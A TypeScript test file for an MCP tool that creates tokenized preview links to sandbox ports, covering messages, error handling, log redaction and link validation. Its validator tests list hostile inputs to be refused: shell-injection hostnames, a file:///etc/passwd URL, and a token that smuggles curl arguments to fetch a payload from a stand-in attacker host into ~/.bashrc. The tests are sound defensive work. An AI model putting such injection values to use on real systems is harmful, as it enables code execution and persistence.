import { timestampFromMs } from "@bufbuild/protobuf/wkt";
import { Code } from "@connectrpc/connect";
import type { Client } from "@modelcontextprotocol/client";
import { describe, expect, it } from "vitest";
import { PlacementState, type CreatePreviewRequest } from "../gen/bugnet/router/v1/router_pb.ts";
import type { Log } from "../log.ts";
import {
    callTool,
    connectTools,
    fakeRouter,
    placement,
    routerError,
    testDeps,
    testHandle,
    testNow,
    type RouterImpl,
} from "../testing/harness.ts";
import { handleTag } from "./common.ts";
import { previewLink } from "./preview.ts";

const token = "bnp_" + "A".repeat(43);
const host = "abcdefghijklmnop.preview.bugnet.sh";
const url = `https://${host}/?bugnet_token=${token}`;
const deadline = timestampFromMs(testNow + 10 * 60_000);

interface PreviewResult {
    message: string;
    url: string;
    token: string;
    expiresAt: string | null;
    listening: boolean;
    previewId: string;
    port: number;
}

interface LogLine {
    msg: string;
    fields: Record<string, unknown> | undefined;
}

function recordingLog(lines: LogLine[]): Log {
    const push = (msg: string, fields?: Record<string, unknown>) => lines.push({ msg, fields });
    return { info: push, warn: push, error: push };
}

function connect(impl: RouterImpl, log?: Log): Promise<Client> {
    return connectTools(testDeps({ router: fakeRouter(impl), ...(log ? { log } : {}) }));
}

function answering(listening: boolean, seen: CreatePreviewRequest[] = []): RouterImpl {
    return {
        createPreview: (req) => {
            seen.push(req);
            return {
                url,
                token,
                expiresAt: deadline,
                listening,
                previewId: "abcdefghijklmnop",
            };
        },
    };
}

function refusing(err: Error, extra: RouterImpl = {}): RouterImpl {
    return {
        createPreview() {
            throw err;
        },
        ...extra,
    };
}

const call = (client: Client, port: unknown = 5173) =>
    callTool<PreviewResult>(client, "bugnet_preview", { handle: testHandle, port });

describe("bugnet_preview", () => {
    it("returns the link, token, expiry and the note for the model", async () => {
        const seen: CreatePreviewRequest[] = [];
        const client = await connect(answering(true, seen));
        const r = await call(client);
        expect(r.isError).toBe(false);
        expect(seen.map((s) => [s.handle, s.port])).toEqual([[testHandle, 5173]]);
        expect(r.structured).toEqual({
            message: expect.any(String),
            url,
            token,
            expiresAt: "2026-11-05T12:10:00.000Z",
            listening: true,
            previewId: "abcdefghijklmnop",
            port: 5173,
        });
        expect(Object.keys(r.structured)[0]).toBe("message");
        expect(r.structured.message).toBe(
            `Preview of port 5173 is at ${url} until 2026-11-05T12:10:00.000Z, time left 10 ` +
                "min. Anyone holding the url or token reaches the app until it expires. A " +
                `browser may first see a Bugnet notice page, curl -H 'Bugnet-Token: ${token}' ` +
                `'https://${host}/path' skips it. Each preview is one origin, so a frontend ` +
                "reaches an API on another port through its dev server's proxy, not a second " +
                "preview. webpack-dev-server needs allowedHosts: 'all', Django needs " +
                `${host} in ALLOWED_HOSTS, and Vite works as is.`,
        );
        expect(r.text).toBe(r.structured.message);
    });

    it("says nothing answered yet when the port is not listening", async () => {
        const client = await connect(answering(false));
        const r = await call(client, 3000);
        expect(r.isError).toBe(false);
        expect(r.structured.listening).toBe(false);
        expect(r.structured.message).toContain(
            "until 2026-11-05T12:10:00.000Z, time left 10 min. Nothing answered on port 3000 " +
                "yet, so the link shows an error page until a server listens there, for example " +
                "one started in the background with bugnet_exec (nohup npm run dev > dev.log " +
                "2>&1 &). Calling bugnet_preview again for port 3000 then shows listening true. " +
                "Anyone holding the url",
        );
        expect(r.structured.message).toContain("allowedHosts: 'all'");
    });

    it("adds https to a link the router gives without a scheme", async () => {
        const client = await connect({
            createPreview: () => ({
                url: `${host}/?bugnet_token=${token}`,
                token,
                expiresAt: deadline,
                listening: true,
                previewId: "abcdefghijklmnop",
            }),
        });
        const r = await call(client);
        expect(r.structured.url).toBe(url);
    });

    it("says the preview lasts to the deadline when the router gives no expiry", async () => {
        const client = await connect({
            createPreview: () => ({ url, token, listening: true, previewId: "p" }),
        });
        const r = await call(client);
        expect(r.structured.expiresAt).toBeNull();
        expect(r.structured.message).toMatch(/is at \S+ until the sandbox's deadline\. /);
    });

    it("logs the handle's tag and never the token or the link", async () => {
        const lines: LogLine[] = [];
        const client = await connect(answering(true), recordingLog(lines));
        await call(client);
        expect(lines).toEqual([
            {
                msg: "preview created",
                fields: {
                    handle: handleTag(testHandle),
                    port: 5173,
                    previewId: "abcdefghijklmnop",
                    listening: true,
                },
            },
        ]);
        const logged = JSON.stringify(lines);
        expect(logged).not.toContain(token);
        expect(logged).not.toContain(testHandle);
    });

    it("refuses a router answer without a token", async () => {
        const client = await connect({
            createPreview: () => ({ url, token: "", listening: true, previewId: "p" }),
        });
        const r = await call(client);
        expect(r.isError).toBe(true);
        expect(r.text).toBe("preview: the router gave no usable token.");
    });

    it("refuses ports outside 1 to 65535 before calling the router", async () => {
        const seen: CreatePreviewRequest[] = [];
        const client = await connect(answering(true, seen));
        for (const port of [0, 65_536, 80.5, -1, "80"]) {
            const r = await call(client, port);
            expect(r.isError).toBe(true);
            expect(r.text).toMatch(/port/);
        }
        expect((await call(client, 65_535)).isError).toBe(false);
        expect((await call(client, 1)).isError).toBe(false);
        expect(seen.map((s) => s.port)).toEqual([65_535, 1]);
    });

    it("says previews are not open yet when the router lacks CreatePreview", async () => {
        const client = await connect({});
        const r = await call(client);
        expect(r.isError).toBe(true);
        expect(r.text).toBe(
            "preview: Bugnet has not opened web previews yet, so a retry now or later, or a new " +
                "sandbox from any quote, gets the same answer. The other Bugnet tools work as " +
                "usual.",
        );
    });

    it("points to a quote with needs preview when the sandbox lacks previews", async () => {
        const client = await connect(
            refusing(routerError(Code.FailedPrecondition, "FEATURE_UNAVAILABLE")),
        );
        const r = await call(client);
        expect(r.isError).toBe(true);
        expect(r.text).toBe(
            "preview: web previews are not open on this sandbox, the other Bugnet tools work " +
                'here as usual. A sandbox started from bugnet_quote with needs ["preview"] has ' +
                "them.",
        );
    });

    it("reports NOT_READY on an ended sandbox as expired", async () => {
        const client = await connect(
            refusing(routerError(Code.FailedPrecondition, "NOT_READY"), {
                getPlacement: () => ({ placement: placement(PlacementState.TERMINATED) }),
            }),
        );
        const r = await call(client);
        expect(r.isError).toBe(true);
        expect(r.text).toBe(
            "preview: this sandbox has ended and everything in it was deleted. Quote and start " +
                "a new one.",
        );
    });

    it("reports NOT_READY on a starting sandbox as still starting", async () => {
        const client = await connect(
            refusing(routerError(Code.FailedPrecondition, "NOT_READY"), {
                getPlacement: () => ({ placement: placement(PlacementState.PLACING) }),
            }),
        );
        const r = await call(client);
        expect(r.text).toBe("preview: the sandbox is still starting, wait with bugnet_status.");
    });

    it("reports a rate limit with its RetryInfo delay", async () => {
        const client = await connect(
            refusing(routerError(Code.ResourceExhausted, "RATE_LIMITED", { retryAfterMs: 4200 })),
        );
        const r = await call(client);
        expect(r.isError).toBe(true);
        expect(r.text).toBe("preview: too many requests for now. Retry after 5 s.");
    });

    it("says a revoked preview stays closed on that port", async () => {
        const client = await connect(
            refusing(routerError(Code.FailedPrecondition, "PREVIEW_REVOKED")),
        );
        const r = await call(client);
        expect(r.isError).toBe(true);
        expect(r.text).toBe(
            "preview: Bugnet closed the preview on this port for good, so a retry gets the " +
                "same answer. A preview on another port still works.",
        );
    });

    it("reports a port the router refuses", async () => {
        const client = await connect(refusing(routerError(Code.InvalidArgument, "PORT_REFUSED")));
        const r = await call(client, 22);
        expect(r.isError).toBe(true);
        expect(r.text).toBe(
            "preview: that port cannot be previewed, the app has to listen on another port.",
        );
    });

    it("passes a bare InvalidArgument on with provider names scrubbed", async () => {
        const client = await connect(
            refusing(
                routerError(Code.InvalidArgument, undefined, {
                    message: "api: e2b rejected the port\nsecond line",
                }),
            ),
        );
        const r = await call(client);
        expect(r.isError).toBe(true);
        expect(r.text).toBe("preview: provider rejected the port.");
    });

    it("reports the per-sandbox preview limit and a spent budget", async () => {
        const many = await connect(
            refusing(routerError(Code.ResourceExhausted, "TOO_MANY_PREVIEWS")),
        );
        expect((await call(many)).text).toBe(
            "preview: this sandbox has as many previews as it may.",
        );
        const spent = await connect(refusing(routerError(Code.ResourceExhausted, "BUDGET_SPENT")));
        expect((await call(spent)).text).toMatch(/^preview: this sandbox has used its network/);
    });

    it("says an unknown handle is unknown", async () => {
        const client = await connect(
            refusing(routerError(Code.NotFound), {
                getPlacement() {
                    throw routerError(Code.NotFound);
                },
            }),
        );
        const r = await call(client);
        expect(r.text).toMatch(/^preview: no sandbox has this handle/);
    });

    it("is marked idempotent, open world and not read only, with a short description", async () => {
        const client = await connect({});
        const { tools } = await client.listTools();
        const t = tools.find((x) => x.name === "bugnet_preview");
        expect(t?.annotations).toEqual({
            readOnlyHint: false,
            destructiveHint: false,
            idempotentHint: true,
            openWorldHint: true,
        });
        expect(t?._meta?.["anthropic/requiresUserInteraction"]).toBeUndefined();
        expect(t?.description?.length).toBeLessThan(600);
        expect(t?.description).toMatch(/needs \["preview"\]/);
        expect(t?.description).not.toMatch(/\b(koyeb|boat|e2b|boxd|instabox)\b/i);
        expect(t?.inputSchema.properties?.port).toMatchObject({ minimum: 1, maximum: 65_535 });
    });
});

describe("previewLink", () => {
    it("keeps an https link under Bugnet's domain and refuses anything else", () => {
        const deps = testDeps();
        expect(previewLink(deps, url, token).host).toBe(host);
        expect(previewLink(deps, `${host}/`, token).href).toBe(`https://${host}/`);
        for (const bad of [
            "http://x.preview.bugnet.sh/",
            "",
            "https://",
            "https://x.preview.evil.example/",
            "https://bugnet.sh.evil.example/",
            "https://user:pw@x.preview.bugnet.sh/",
            "file:///etc/passwd",
            `https://a;id;b.preview.bugnet.sh/?bugnet_token=${token}`,
            "https://x$(id)`id`.preview.bugnet.sh/",
            "https://abcdefghijklmno.preview.bugnet.sh/",
            "https://x.abcdefghijklmnop.preview.bugnet.sh/",
            "https://abcdefghijklmnop.transfer.bugnet.sh/",
            "https://transfer.bugnet.sh/",
            "https://preview.bugnet.sh/",
            `https://${host}/?bugnet_token=bnp_${"B".repeat(43)}`,
            `https://${host}/?bugnet_token=${token}&x=1`,
            `https://${host}/?x=1`,
        ]) {
            expect(() => previewLink(deps, bad, token), bad).toThrow(/no usable link/);
        }
    });

    it("refuses a token that is not a preview token, since it goes into a curl command", async () => {
        for (const bad of ["bnp_x' -o ~/.bashrc 'https://evil.example/payload", "", "bnp_short"]) {
            const client = await connect({
                createPreview: () => ({ url, token: bad, expiresAt: deadline, listening: true }),
            });
            const r = await call(client);
            expect(r.isError).toBe(true);
            expect(r.text).toBe("preview: the router gave no usable token.");
        }
    });
});
